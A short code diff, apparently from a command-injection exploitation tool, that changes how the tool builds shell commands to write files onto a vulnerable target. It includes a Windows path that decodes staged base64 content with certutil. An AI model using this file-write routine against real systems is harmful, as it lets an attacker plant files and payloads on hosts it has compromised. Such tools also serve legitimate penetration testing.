@@ -95,7 +95,7 @@ def file_write(separator, TAG, prefix, suffix, http_request_method, url, vuln_pa
     # Find filename
     filname = os.path.basename(dest_to_write)
     tmp_filname = "tmp_" + filname
-    cmd = settings.FILE_WRITE + " " + content + " > " + tmp_filname
+    cmd = settings.FILE_WRITE + " " + content + ">" + tmp_filname
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
     # Decode base 64 encoding
     cmd = "certutil -decode "  + tmp_filname + " " + filname
@@ -110,7 +110,7 @@ def file_write(separator, TAG, prefix, suffix, http_request_method, url, vuln_pa
     dest_to_write = path + "\\" + filname
 
   else:
-    cmd = settings.FILE_WRITE + " '" + content + "'" + " > " + "'" + dest_to_write + "'"
+    cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'"
     response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
     shell = eb_injector.injection_results(response, TAG)
     shell = "".join(str(p) for p in shell)
